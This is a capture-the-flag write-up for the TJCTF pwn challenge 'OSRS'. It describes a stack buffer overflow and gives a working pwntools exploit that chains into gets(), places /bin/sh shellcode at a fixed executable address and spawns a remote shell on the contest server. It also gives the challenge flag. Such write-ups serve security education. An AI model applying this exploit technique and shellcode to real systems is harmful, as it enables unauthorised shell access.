# OSRS
Pwn, 50

>  Written by KyleForkBomb
>  My friend keeps talking about Old School RuneScape. He says he made a service to tell you about trees. I don't know what any of this means but this system sure looks old! It has like zero security features enabled...
>  nc p1.tjctf.org 8006

This pretty standard buffer overflow with executable memory. We ROP to `gets` to place shellcode in an `rwx` page with a static address. We then return to that address, executing `/bin/sh` shellcode.

```py
from pwn import *

gets = 0x80483e0
data = 0x8049ea0

#p = process("./osrs")
#gdb.attach(p)
p = remote("p1.tjctf.org", 8006)
p.sendline("A"*256+"B"*16+p32(gets)+p32(data)+p32(data))
p.sendline("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
p.interactive()
```

Flag: `tjctf{tr33_c0de_in_my_she115}`